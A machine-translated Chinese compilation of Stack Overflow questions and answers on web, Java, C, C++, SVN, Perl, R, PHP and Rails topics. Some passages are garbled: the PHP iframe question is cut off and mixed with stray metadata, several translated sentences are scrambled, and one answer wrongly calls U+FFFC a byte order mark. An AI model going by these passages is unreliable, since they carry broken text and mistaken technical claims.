http://example.com/%EF%BF%BCfull_img/hey.jpg 
```

这是`%EF%BF%BC`从哪里来的？它是什么？最重要的是，我该如何摆脱它？

其他一些线索：这是一个 Drupal 7 站点，运行 jQuery 1.5.1。我在网站的其他地方使用相同的 Fancybox 脚本，没有任何问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T20:59:06.463

`%EF%BF%BC`是三个 URL 编码字符的序列。

您显然看不到字符串中的任何意外字符。那是因为字符序列`%EF%BF%BC`是不可见的。

它实际上是一个 UTF-8 字节顺序标记序列。此序列通常出现在 UTF-8 编码文本文件的开头。当您从另一个文件复制+粘贴时，他们可能会进入您的代码。

摆脱它们的最快方法是找到复制+粘贴的代码位，删除问题两侧的字符，然后重新键入它们。根据您的编辑器，您可能会发现删除的行为很奇怪，因为它会删除隐藏的字符。

一些文本编辑器和 IDE 将具有显示隐藏字符的选项。如果你的编辑有这个，它可能会帮助你查看神秘人物的位置，以便你可以删除它们。

希望有帮助。

# java - Collection 是否比 LinkedList 更好？

> ID：15510113
> 
> 赞同：5
> 
> 时间：2013-03-19T20:47:09.030
> 
> 标签：java, collections

```
Collection list = new LinkedList(); // Good?
LinkedList list = new LinkedList(); // Bad? 
```

第一个变体提供了更大的灵活性，但仅此而已吗？还有其他喜欢它的理由吗？性能呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T21:00:56.110

这些是设计决策，一种尺寸通常并不适合所有人。此外，成员变量内部使用的内容的选择可以（并且通常应该）不同于暴露给外部世界的内容。

从本质上讲，Java 的集合框架并没有提供一套完整的接口来描述*性能*特征而不暴露实现细节。描述性能的一个接口[`RandomAccess`](http://docs.oracle.com/javase/6/docs/api/java/util/RandomAccess.html)是标记接口，甚至不扩展`Collection`或重新公开`get(index)`API。所以我认为没有一个好的答案。

根据经验，在我识别（并记录）一些重要的特征之前，我会尽可能保持类型不具体。例如，一旦我想让方法知道保留插入顺序，我就会从`Collection`to更改为`List`，并记录为什么该限制很重要。同样，如果说从前面有效移除变得很重要，那么从`List`到移动。`LinkedList`

在公开 API 中公开集合时，我总是尝试只公开少数预期会被使用的 API；例如`add(...)`和`iterator()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T20:49:04.273

```
Collection list = new LinkedList(); //bad 
```

这很糟糕，因为您不希望这个引用引用一个 HashSet（因为 HashSet 也实现了 Collection，集合框架中的许多其他类也是如此）。

```
LinkedList list = new LinkedList(); //bad? 
```

这很糟糕，因为好的做法是始终对接口进行编码。

```
List list = new LinkedList();//good 
```

这很好，因为点 2 天。（[**总是编程到接口**](https://stackoverflow.com/questions/340623/programming-to-an-interface-how-to-decide-where-its-needed)）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-19T20:52:10.853

对非公共对象使用最具体的类型信息。它们是实现细节，我们希望我们的实现细节尽可能具体和精确。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-19T20:50:15.970

当然。例如，如果 java 会为 List 集合找到并实现更有效的实现，但您已经拥有只接受 LinkedList 的 API，如果您已经有此 API 的客户端，您将无法替换实现。如果您使用接口，您可以轻松地替换实现而不破坏 API。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-19T20:48:52.003

它们是绝对等价的。使用其中一个的唯一原因是，如果您以后要使用仅存在于类 LinkedList 中的列表功能，则需要使用第二个。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-19T20:59:58.800

我的一般规则是只在你当时需要的具体情况下（或在不久的将来，在合理范围内）。当然，这有点主观。

在您的示例中，我通常将其声明为 a`List`只是因为可用的方法不是很强大，并且 a和另一个（,等）`Collection`之间的区别通常在逻辑上很重要。`List``Collection``Map``Set`

此外，在 Java 1.5+ 中不要使用原始类型——如果您不知道列表将包含的类型，至少使用`List<?>`.

# javascript - jquery .find() 方法——由逗号连接的doms组成的参数

> ID：15510118
> 
> 赞同：1
> 
> 时间：2013-03-19T20:47:19.803
> 
> 标签：javascript, jquery

我见过这样的代码`jQuery.find()`，参数用逗号分隔，即`div, input, select`.

```
newRow.find('div, input, select').each(function() {
  ......
}); 
```

这是什么意思？是不是类似于“div下的选择输入框”？我找不到有关此功能的官方文档。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-19T20:48:15.007

这是一个 CSS 选择器。被称为“分组”，意思是“查找所有`div`，`input`和`select`元素”。

[http://www.w3.org/TR/CSS2/selector.html#grouping](http://www.w3.org/TR/CSS2/selector.html#grouping)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:49:42.727

您提供的代码将在对象`newRow`中查找任何或元素`div`，然后它会为找到的每个元素运行函数中的代码。`input``select``each`

# svn - 如何将包含文件的现有文件夹添加到 SVN？

> ID：15510119
> 
> 赞同：85
> 
> 时间：2013-03-19T20:47:23.727
> 
> 标签：svn

如何将没有版本控制的文件夹添加到特定的 SVN 位置？我经常开始编写代码，只有在我有几个包含代码文件的文件夹后，我才会将它添加到 SVN。

我通常做的是：

1.  **svn co**我想创建一个新文件夹来存储我的代码的父目录。
2.  **svn mkdir**来创建我想要放入我的代码的目录。
3.  复制并粘贴我的代码。
4.  **svn 提交**。
5.  删除我当前的工作代码目录。
6.  **使用svn co**重新创建我的工作代码目录。

* * *

## 回答 #1

> 赞同：139
> 
> 时间：2015-06-21T15:36:08.807

假设我在目录中有代码`~/local_dir/myNewApp`，我想把它放在“ [https://svn.host/existing_path/myNewApp](https://svn.host/existing_path/myNewApp) ”下（同时能够忽略一些二进制文件、供应商库等）。

1.  在存储库中创建一个空文件夹`svn mkdir https://svn.host/existing_path/myNewApp`
2.  转到项目的父目录，`cd ~/local_dir`
3.  查看本地文件夹上的空目录。不要害怕 - 您在本地拥有的文件不会被删除。`svn co https://svn.host/existing_path/myNewApp`. 如果您的文件夹在本地与存储库中的名称不同，则必须将其指定为附加参数。
4.  您可以看到`svn st`现在将所有文件显示为`?`，这意味着它们当前不受修订控制
5.  `svn add`对要添加到存储库的文件执行，并将其他文件添加到`svn:ignore`. `svn help add`例如，当您只想选择性地添加一些文件/文件夹时，`--parents`您`--depth empty`可能会发现一些有用的选项。
6.  提交`svn ci`

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2013-03-19T22:06:53.193

如果我正确理解了您的用例，我建议尝试使用**svn add**将新文件夹放在版本下，请参见[此处](http://svnbook.red-bean.com/en/1.7/svn.ref.svn.c.add.html)。以下将在版本控制下递归地添加带有文件的新文件夹（如果您在有效的工作副本中）：

```
svn add new_folder
svn commit -m "Add New folder to the project" 
```

如果您不在工作副本中，请使用**svn checkout**创建它，将 new_folder 复制到那里并执行上述步骤。

**或者**

试试**svn import**，看[这里](http://svnbook.red-bean.com/en/1.7/svn.ref.svn.c.import.html)；以下将创建一个新文件夹并将文件上传到存储库：

```
svn import -m "Import new folder to the project" new_folder \
        http://SVN_REPO/repos/trunk/new_folder 
```

另请注意：

> 导入数据后，请注意原始树不受版本控制。要开始工作，您仍然需要 svn checkout 树的新工作副本

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-07-14T20:53:13.217

我不使用命令。您应该能够使用 GUI 执行此操作：

*   右键单击 My Documents 文件夹中的空白区域，选择 TortoiseSVN > Repo-browser。
*   输入[http://subversion](http://subversion) ...（您将保存到的 Subversion 服务器/目录的 URL 路径）作为路径并选择 OK
*   右键单击 Repo 中的根目录，然后选择**Add folder**。给它你的项目的名称并创建它。
*   右键单击 Repo 浏览器中的项目文件夹，然后选择**Checkout**。Checkout 目录将是您的`Visual Studio\Projects\{your project}`文件夹。选择确定。
*   您将收到文件夹不为空的警告。对签出/导出到该文件夹​​说**“是”** - 它不会覆盖您的项目文件。
*   打开您的项目文件夹。您将在与您的 VS 项目关联但尚未添加到 Subversion 的文件夹上看到问号。使用 Ctrl + 单击选择这些文件夹，然后右键单击所选项目之一并选择**TortoiseSVN > 添加**
*   在提示符下选择确定
*   您的文件应该添加。在 Add Finished 上选择 OK！对话
*   右键单击文件夹的空白区域并选择刷新。您现在会在文件夹/文件上看到“+”图标
*   再次右键单击文件夹中的空白区域并选择**SVN Commit**
*   添加有关您所提交内容的消息，然后单击“确定”

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-12-06T05:17:52.667

在 Windows 7 中，我这样做了：

1.  你安装了 SVN 和 Tortoise SVN 了吗？如果没有，谷歌他们，现在就这样做。
2.  转到您可能有其他存储库（存储库的缩写）的 SVN 文件夹（或者如果您从头开始创建一个，请选择位置 C 驱动器、D 驱动器等或网络路径）。
3.  创建一个新文件夹来存储您的新存储库。将其命名为与您的项目名称相同的名称
4.  右键单击文件夹并选择 Tortoise SVN -> 在此处创建存储库
5.  对创建文件夹结构说“是”
6.  单击确定。您应该在新文件夹/repo 旁边看到一个看起来像“wave”的新图标
7.  右键单击新的 repo 并选择 SVN Repo Browser
8.  右键单击“树干”
9.  选择 ADD Folder... 并指向您正在开发的项目的文件夹结构。
10.  单击确定，SVN 将添加您的文件夹结构。请耐心等待！看起来 SVN 已经崩溃/冻结。不用担心。它正在做它的工作。

完毕！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-08-10T07:26:03.663

3个步骤：

*   打开“回购浏览器”（使用您父文件夹的链接）。
*   右键单击选择“添加文件夹”。
*   浏览到您的文件夹。

[![在此处输入图像描述](../Images/24016d8bc47357e129808c34e563b470.png)](https://i.stack.imgur.com/oxjbD.png)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-07-04T14:18:09.500

如果打算将本地/工作副本添加到 SVN，我曾经按照以下方式进行操作。

注意：我使用[TortoiseSVN](http://en.wikipedia.org/wiki/TortoiseSVN)客户端，这些步骤假设您已经安装了 TortoiseSVN 客户端。

1.  我在本地有一个项目（Test-4.2.2）。我想将其上传/添加到 SVN 存储库。
2.  使用 TortoiseSVN 存储库浏览器，我创建了一个空目录“Test-4.2.2”
3.  在我的本地，我将现有的“Test-4.2.2”目录重命名为“Test-4.2.2.1”（临时）
4.  将 SVN 中的空“Test-4.2.2”签出到本地
5.  将4.2.2.1下的所有子目录复制到这个结账目录4.2.2
6.  现在，右键单击“Test-4.2.2”并提交。
7.  删除临时文件夹“Test-4.2.2.1”

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-06-18T10:37:47.703

让我们试试..它对我有用..

```
svn add * --force 
```

# c++ - 使用“auto;”键入推理

> ID：15510126
> 
> 赞同：0
> 
> 时间：2013-03-19T20:48:00.203
> 
> 标签：c++, c++11, type-inference

1.  来自[维基百科](http://en.wikipedia.org/wiki/C%2B%2B11#Alternative_function_syntax)

    **`auto`** 如果不是自动类型推导，在这种情况下（下）关键字的用途是什么？

    ```
    struct SomeStruct {
        auto func_name(int x, int y) -> int;
    };

    auto SomeStruct::func_name(int x, int y) -> int {return x + y; } 
    ```

2.  在哪些情况下需要**明确**具有类型？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-19T20:49:43.830

这是尾随返回类型。`auto`只是一个占位符，表示返回类型稍后出现。

这样做的原因是参数名称可以用于计算返回类型：

```
template<typename L, typename R>
auto add(L l, R r) -> decltype(l+r) { return l+r; } 
```

替代方案是：

```
template<typename L, typename R>
decltype(std::declval<L>()+std::declval<R>())
add(L l, R r)
{ return l+r; } 
```

该语言的未来添加可能是允许省略尾随返回类型，而是使用 lambdas 允许的自动类型推导。

```
template<typename L, typename R>
auto add(L l, R r) { return l+r; } 
```

# javascript - 为什么在实现事件时不使用 IIFE 保护隐私？

> ID：15510127
> 
> 赞同：2
> 
> 时间：2013-03-19T20:48:00.827
> 
> 标签：javascript, backbone.js

在[主干](http://backbonejs.org/)中，当存储事件时，此约定用于表示私有变量：

```
_events 
```

然而，正如我们所知，这个财产在很大程度上不是私人的。为什么不做这样的事情来让它真正私密呢？

```
var Events = (function () {
    var publik = {},
        events = {},      // private object literal
        eventsApi,        // private method
        triggerEvents;    // private method

    // define publik Events methods here

    return publik;
})();

_.extend(Backbone, Events); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:13:14.180

否则，这是一个约定俗成的问题。

惯例是人们不会让它变得困难。使用一个简单的函数，没有 IIFE，如果他们迫切需要，让人们弄乱你的“私有”变量。

你有没有因为这个库隐藏了它的变量而不得不改变一个库的代码？好吧，当它发生时，它是一个真正的痛苦。让变量可用，即使它们是“按惯例私有的”，也是一个真正的好处。

作为参考，[Common Lisp][0] 默认所有变量都是私有的。您可以手动导出一些。但是你总是可以使用特殊的语法来访问私有变量，从而清楚地表明代码正在做它不应该做的事情（与“未定义的行为”相混淆）。

[0]：可以说[是最强大的语言](http://www.paulgraham.com/avg.html)，但显然是基于一种 Javascript。

# twitter-bootstrap - Bootstrap 图标经常隐藏

> ID：15510132
> 
> 赞同：0
> 
> 时间：2013-03-19T20:48:16.737
> 
> 标签：twitter-bootstrap

我们在我们的网站上使用 Bootmetro（Bootstrap 主题）。我发现经常不显示 icomoon 图标。6-7 次刷新后，它再次出现。我虽然这是浏览器的错。所以我在另一个浏览器中打开了网站（图标消失的那一刻）。但它没有出现在其他浏览器中。

知道为什么这些图标经常消失吗？（一次所有页面上的所有图标一起下降）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:52:26.567

您使用的是哪个浏览器？

这看起来可能相关：[http ://css-tricks.com/forums/discussion/21653/issue-with-icon-fonts-in-chrome-23/p1](http://css-tricks.com/forums/discussion/21653/issue-with-icon-fonts-in-chrome-23/p1)

或者这样：[使用 IcoMoon 字体和在 Chrome 上查看是否存在已知故障？](https://stackoverflow.com/questions/13203929/is-there-a-known-glitch-with-using-icomoon-fonts-and-viewing-on-chrome)

# javascript - 编辑后如何计算 HighChart 中的点总和

> ID：15510136
> 
> 赞同：0
> 
> 时间：2013-03-19T20:48:24.230
> 
> 标签：javascript, highcharts

我有一个与此示例类似的可拖动点的高图，[http://jsfiddle.net/highcharts/AyUbx/](http://jsfiddle.net/highcharts/AyUbx/)，除了我只使用面积样条图。这一系列点取自这个数组`data = [1,5,3,8,12]`

在我拖动图表上的任何点之前，我计算曲线上的点的总和，我得到 29。但是，我需要在移动图表上的点之后计算点的总和。做这个的最好方式是什么？我一直在兜圈子，我似乎无法弄清楚？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:56:47.857

这应该适用于堆叠条：

```
var dataItem = chart.series[X].data[Y],
    dataValue = dataItem.percentage/100*dataItem.total; 
```

对于折线图，您应该能够：

```
dataValue = dataItem.y; 
```

看这里：

[http://jsfiddle.net/AyUbx/720/](http://jsfiddle.net/AyUbx/720/)

```
$("#sum").text(series.data.reduce(function(a,b){
    return a + b.y;
},0)); 
```

# xml - DOM 加载一个空文档 - php

> ID：15510137
> 
> 赞同：0
> 
> 时间：2013-03-19T20:48:26.150
> 
> 标签：xml, dom, domdocument, php

我写了以下代码：

```
$xmldom = new DOMDocument();
$xmldom->load('http://www.robot-domestici.it/joomla/component/virtuemart/robot-domestici/robot-pulizia-casa?page=shop.feed'); 
```

但是加载的文档是空的（这个类别不包含任何产品）并且出现以下错误：

```
Warning: DOMDocument::load(): Document is empty in http://www.robot-domestici.it/joomla/component/virtuemart/robot-domestici/robot-pulizia-casa?page=shop.feed, line: 1 in C:\Users\Jacopo\Dropbox\Tirocinio\xampp-portable\htdocs\sites\prova\cerca categorie2.php on line 73

Warning: DOMDocument::load(): Start tag expected, '<' not found in http://www.robot-domestici.it/joomla/component/virtuemart/robot-domestici/robot-pulizia-casa?page=shop.feed, line: 1 in C:\Users\Jacopo\Dropbox\Tirocinio\xampp-portable\htdocs\sites\prova\cerca categorie2.php on line 73 
```

并中断执行。显然 URL 是动态生成的，甚至提要的内容也可以更改，所以我不知道哪个 URL 将为空。我要做一些检查，但我不知道我能做什么....我试图将提要存储在一个变量中，但它不起作用：

```
$str=file_get_contents('http://www.robot-domestici.it/joomla/component/virtuemart/robot-domestici/robot-pulizia-casa?page=shop.feed');
if($str==='')
        return; 
```

我能做些什么？

# iphone - 如何将 appDelegate 绑定到应用程序的其余部分？

> ID：15510146
> 
> 赞同：1
> 
> 时间：2013-03-19T20:48:48.173
> 
> 标签：iphone, ios, ipad, uiviewcontroller, appdelegate

我是 iOS 开发的相对初学者，但我设法让我的应用程序做我想做的一切。但是，我有一些关于将应用程序捆绑在一起的问题。

我目前在 appDelegate 中的唯一代码处理远程通知；当我收到远程通知时，我会向用户发送警报、消息等。我还为通知中心生成通知，这会导致不同的方法在不同的视图控制器中运行。

appDelegate 中的所有不同功能又如何呢？DidEnterBackground、WillEnterForeground 等？我的应用程序从一个视图 (view1) 开始，该视图创建了一个对象 (stream1)，该对象有一个 stopStream 方法。我有按钮来启动和停止流（[self.stream1 stopStream]）。我的问题是，如何调用这些方法以在其中一个 appDelegate 方法中停止该对象的特定实例？我是否需要在 appDelegate 中为通知中心创建通知，并在视图中处理它的触发？或者有没有更简单的方法？还是我做的事情完全错误，没有按照最佳实践？

任何帮助，将不胜感激！还有一个关于应用程序架构的指南的链接，或者一个你最喜欢的关于在 iOS 中构建应用程序的书的链接会很棒！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T20:56:44.193

如果应用程序委托确实需要对这些事件执行某些操作，则您的应用程序委托只需要实现各种应用程序委托方法。

如果给定的视图控制器或其他类对各种应用程序委托通知感兴趣（例如进入后台或返回前台等），则视图控制器或其他类应注册相应的通知。`UIApplication`有关不同的通知，请参阅文档。

不要让应用程序委托方法发布自定义通知。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T20:53:14.753

您正在寻找的所有方法都可以[在 docs 中](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIApplicationDelegate_Protocol/Reference/Reference.html)列出。

至于如何处理它们，这绝对取决于您的应用程序。最好的做法是至少正确处理进出后台，因此至少使用这些方法并在您的应用程序中采取适当的操作。

像您提到的那样简单地爆出 NSNotification 的应用程序很常见。在大多数情况下它是完全可以接受的。

# c - 十六进制长整数文字“L”的C解释

> ID：15510151
> 
> 赞同：1
> 
> 时间：2013-03-19T20:49:04.897
> 
> 标签：c, casting, 64-bit, long-integer, 32-bit

根据自动转换，C 编译器如何解释表示长整数文字的“L”？以下代码在 32 位平台（32 位长，64 位长长）上运行时，似乎将表达式“(0xffffffffL)”转换为 64 位整数 4294967295，而不是 32 位 -1。

示例代码：

```
#include <stdio.h>

int main(void)
{
  long long x = 10;
  long long y = (0xffffffffL);
  long long z = (long)(0xffffffffL);

  printf("long long x == %lld\n", x);
  printf("long long y == %lld\n", y);
  printf("long long z == %lld\n", z);

  printf("0xffffffffL == %ld\n", 0xffffffffL);

  if (x > (long)(0xffffffffL))
    printf("x > (long)(0xffffffffL)\n");
  else
    printf("x <= (long)(0xffffffffL)\n");

  if (x > (0xffffffffL))
    printf("x > (0xffffffffL)\n");
  else
    printf("x <= (0xffffffffL)\n");
  return 0;
} 
```

输出（在 32 位 Debian 上使用 GCC 4.5.3 编译）：

```
long long x == 10
long long y == 4294967295
long long z == -1
0xffffffffL == -1
x > (long)(0xffffffffL)
x <= (0xffffffffL) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T20:53:12.927

它是一个十六进制文字，所以它的类型可以是无符号的。它适合`unsigned long`，所以这就是它得到的类型。见标准第 6.4.4.1 节：

> 整数常量的类型是可以表示其值的对应列表中的第一个。

带有后缀的十六进制文字列表`L`是

1.  `long`
2.  `unsigned long`
3.  `long long`
4.  `unsigned long long`

由于它不适合 32-bit signed `long`，而是 unsigned 32-bit `unsigned long`，这就是它的样子。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-19T20:51:55.923

问题是确定整数文字类型的规则会有所不同，具体取决于您是十进制数还是十六进制数（或八进制数）。十进制文字总是有符号的，除非后缀带有 U。如果带符号的类型不能包含值，十六进制或八进制文字也可以是无符号的。

# php - jquery 在文本框中检索值并放入 php 变量中？

> ID：15510152
> 
> 赞同：-3
> 
> 时间：2013-03-19T20:49:07.580
> 
> 标签：php, jquery, textbox

我需要在不刷新的情况下获取文本框中的值，以便可以基于它执行 sql 语句。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:10:52.803

一个非常简单的方法是在事件触发时执行 jQuery .load()。这可能是按钮单击或 .keyup() 事件。

```
$('#txtBox').keyup(function(){
    //COLLECT TXTBOX VALUE
    var value=$('#txtBox_selector').val()
    //SEND VALUE TO SERVER FOR ... WHATEVER YOU WANT TO DO WITH IT
    $('#your_selector').html('Loading...').load('path/to/script','value='+value);
}) 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:51:31.127

如果您使用的是 jQuery，则可以使用函数`.val()`, then`.post()`对 PHP 页面执行 HTTP 发布。然后，您可以访问 PHP 数组中的值`$_POST`。

Javascript 是客户端语言，而 PHP 是服务器端语言。该变量可以使用 AJAX 传递，jQuery`.post()`就足够了。

```
//fetch the value of div "input"
var value = $(#'input').val();

//perform a HTTP post
$.post("dest_page.php", {
  input: value
}); 
```

然后在PHP中访问。

```
$input = $_POST['input']; 
```

# c# - SharePoint 2010 关键字查询返回空托管属性

> ID：15510154
> 
> 赞同：1
> 
> 时间：2013-03-19T20:49:24.180
> 
> 标签：c#, sharepoint, sharepoint-2010, applicationpage, keywordquery

[我按照http://technet.microsoft.com/en-us/library/ff621097(v=office.14).aspx](http://technet.microsoft.com/en-us/library/ff621097(v=office.14).aspx)上的说明创建了一些托管属性。然后，我使用以下代码创建了一个自定义 SharePoint 应用程序页面，其中包含 KeywordQuery 搜索以仅查找文档：

```
using System;
using System.Collections.Generic;
using System.Data;
using Microsoft.Office.Server.Search.Query;
using Microsoft.SharePoint.WebControls;

protected System.Data.DataTable TrySearch(string keywords, Int32 pageSize, Int32 page, out Int32 totalPages)
{

    int startRow = (page - 1)*rowLimit;

    var kwq = new KeywordQuery(Site);
    kwq.QueryText = string.Format("Title:\"{0}\"", keywords);
    kwq.ResultTypes = ResultType.RelevantResults;
    kwq.RowLimit = pageSize;
    kwq.StartRow = startRow;
    kwq.TrimDuplicates = true;
    kwq.HiddenConstraints = "path:\"*/User Docs*\" AND IsDocument:true";
    kwq.KeywordInclusion = KeywordInclusion.AllKeywords;

    // Default
    kwq.SelectProperties.Add("WorkId");
    kwq.SelectProperties.Add("Rank");
    kwq.SelectProperties.Add("Title");
    kwq.SelectProperties.Add("Path");
    kwq.SelectProperties.Add("SiteName");
    kwq.SelectProperties.Add("HitHighlightedSummary");
    kwq.SelectProperties.Add("HitHighlightedProperties");
    kwq.SelectProperties.Add("ContentClass");
    kwq.SelectProperties.Add("IsDocument");

    // Custom (they come back blank even when set as managed properties)
    kwq.SelectProperties.Add("IntroText");
    kwq.SelectProperties.Add("Date");
    kwq.SelectProperties.Add("ListItemId");        

    ResultTableCollection rtc = kwq.Execute();

    var results = new DataTable();

    if (rtc.Count == 0)
    {
        totalPages = 0;
        return results;
    }

    using (ResultTable relevantResults = rtc[ResultType.RelevantResults])
    {
        results.Load(relevantResults, LoadOption.OverwriteChanges);
        totalPages = (int) Math.Round((double) relevantResults.TotalRows/pageSize);
    }

    return results;
} 
```

我的问题是，无论我做什么，我都无法为我的托管属性取回值。搜索工作正常。我可以相应地过滤并得到我期望的结果，只是自定义列是空的。我最关心的是 ID，但我很想获得我要求的所有自定义属性。

我在服务器上错过了某种设置吗？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-04T07:08:19.140

我想你现在一定已经找到了解决方案，但对于那些在同样问题上苦苦挣扎的人来说，解决方案是：

将爬网属性映射到现有/新托管属性后，**再次爬网**。而已。将显示所请求属性的数据。

# php - 一个 for codes

I want to be able to get users to provide their own code

First of all, I already have "$userid 've got the value:

```
$usrid = mysql_result($

> ID：15510157
> 
>         
> 
> 赞同：-1
> 
>         
> 
> 时间：2013-03-19T20:49:27.767
> 
>         
> 
> 标签：php, textarea

* * *

## 回答 #1

> 赞同：3
> 
>             
> 
> 时间：2013-03-19T20:53:48.373

哈米德，应该是：

```
$string = '<!--cod Start-->
<iframe src="http://mysite.ir/code.php?id='. $usrid .'" name="Noruz" width=250 height=250"></iframe>
<!--cod END--> '; 
``` 
```

# arrays - 如何在 perl 中访问哈希数组？

> ID：15510161
> 
> 赞同：6
> 
> 时间：2013-03-19T20:49:42.883
> 
> 标签：arrays, perl, hash, push

我有一大堆哈希，我想从数组中获取一些哈希并插入新数组而不更改第一个数组。我在将哈希推送到数组时遇到问题，如何访问作为哈希的第 i 个元素。

```
my @myarray;
$my_hash->{firstname} = "firstname";
$my_hash->{lastname} = "lastname";
$my_hash->{age} = "25";
$my_hash->{location} = "WI";
push @myarray,$my_hash;

$my_hash->{firstname} = "Lily";
$my_hash->{lastname} = "Bily";
$my_hash->{age} = "22";
$my_hash->{location} = "CA";
push @myarray,$my_hash;

$my_hash->{firstname} = "something";
$my_hash->{lastname} = "otherthing";
$my_hash->{age} = "22";
$my_hash->{location} = "NY";
push @myarray,$my_hash;

my @modifymyhash;
for (my $i=0;$i<2; $i++)  {
        print "No ".$i."\n";
        push (@modifymyhash, $myarray[$i]);
        print "".$myarray[$i]."\n";  #How do I print first ith element of array which is hash.
 } 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-19T21:01:16.447

首先你应该

```
use strict;
use warnings; 
```

然后定义

```
my $my_hash; 
```

`$my_hash`在赋值之前初始化，否则你会覆盖它并且所有三个元素都指向同一个哈希

```
$my_hash = {}; 
```

最后，访问哈希的成员

```
$myarray[$i]->{firstname} 
```

或打印整个哈希，您可以使用[Data::Dumper](http://perldoc.perl.org/Data/Dumper.html)例如

```
print Dumper($myarray[$i])."\n"; 
```

或其他方法，[如何在 Perl 中打印散列的内容？](https://stackoverflow.com/questions/1162245/how-can-i-print-the-contents-of-a-hash-in-perl)或[如何在 Perl 中打印哈希结构？](https://stackoverflow.com/questions/2431032/how-do-i-print-a-hash-structure-in-perl)

**更新**您的评论：

你用

```
push (@modifymyhash, $myarray[$i]); 
```

进入新数组，效果很好。你可以验证

```
foreach my $h (@myarray) {
    print Dumper($h), "\n";
}

foreach my $h (@modifymyhash) {
    print Dumper($h), "\n";
} 
```

两个数组具有相同的哈希值。

如果要进行深度复制，而不仅仅是引用，您可以分配一个新的哈希并将`ith`元素复制到副本中。然后将副本存储在`@modifymyhash`

```
my $copy = {};
%{$copy} = %{$myarray[$i]};
push (@modifymyhash, $copy); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:02:11.567

要取消引用哈希，请使用`%{ ... }`：

```
print  %{ $myarray[$i] }, "\n"; 
```

这可能仍然不能满足您的要求。要很好地打印散列，您必须对其进行迭代，没有“好的”字符串化：

```
print $_, ':', $myarray[$i]{$_}, "\n" for keys %{ $myarray[$i] }; 
```

# r - 从预定义的 R 函数中提取特定数据

> ID：15510163
> 
> 赞同：0
> 
> 时间：2013-03-19T20:49:44.880
> 
> 标签：r, vector

我试图弄清楚如何从预定义的 R 函数中提取特定部分的输出。一个简单的例子是，如果我想存储`mean`通过函数计算的值`summary()`。我知道我可以简单地使用该`mean()`函数，但同样，这是一个简单的示例。

如果我`summary()`在一个循环中的多个数据集上运行该函数，我想存储每个数据集的计算平均值（可能在一个新向量中，比如名为“平均值”），以供以后使用。这是我尝试过的一个简单示例：

```
>sum <- summary(data$Column1)
>sum
 Min. 1st Qu.  Median    Mean 3rd Qu.    Max. 
 0.0300  0.1500  0.2200  0.3471  0.4000  2.5000 
>names(sum)
[1] "Min."    "1st Qu." "Median"  "Mean"   
[5] "3rd Qu." "Max."   
>sum$Mean
Error in sum$Mean : $ operator is invalid for atomic vectors 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:50:58.230

您的变量`sum`是一个命名向量。要提取元素，请使用

```
sum["Mean"] 
```

或者

```
sum[4] 
```

一点。避免使用`sum`，因为这也是标准函数的名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:01:07.117

您可以通过直接对函数进行子集来跳过存储函数的整个输出的步骤

```
means<-vector()
means[1]<-summary(data$Column1)["Mean"] 
```

# ruby-on-rails-3 - Rails 3 中的资产管道未提供资产

> ID：15510168
> 
> 赞同：1
> 
> 时间：2013-03-19T20:49:58.027
> 
> 标签：ruby-on-rails-3, asset-pipeline, assets, ruby-on-rails-2

我正在将一个大型应用程序从 Rails 2 迁移到 Rails 3。我在 app/assets/images 中添加了一些图像。即应用程序/资产/图像/key.png

如果我去`http://localhost:3000/assets/key.png`我看不到图像。在服务器日志中，我看到它没有找到，并且其中一个控制器开始处理请求。

```
Started GET "/assets/key.png" for 127.0.0.1 at 2013-03-19 17:44:31 -0300
Served asset /key.png - 404 Not Found (49ms)
Processing by DfcController#index as PNG
  Parameters: {"path"=>"assets/key"} 
```

在 development.rb 我有以下几行：

```
config.assets.debug = true
config.serve_static_assets = false 
```

在 application.rb 我有以下几行：

```
config.assets.enabled = true
config.assets.version = '1.0' 
```

有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T02:26:45.527

你应该改变

```
config.serve_static_assets = true 
```

在你的 development.rb 中。因为在开发过程中，您的 Rails 应用程序服务器也充当您的 Web 服务器，并且应该为静态资产提供服务。

# c++ - 在 .h 中调用 .cpp 方法

> ID：15510169
> 
> 赞同：0
> 
> 时间：2013-03-19T20:49:59.937
> 
> 标签：c++, visual-c++, onclick

我正在尝试使用 Visual C++ 编写一个简单的 Windows 窗体应用程序

我的问题是我在 .cpp 上构建了一个函数

### Form1.cpp

```
bool function()
{
    //code
} 
```

问题是我试图从.h文件调用这个函数来点击按钮

### 表格1.h

```
private: 
System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) {
    bool result = function();
} 
```

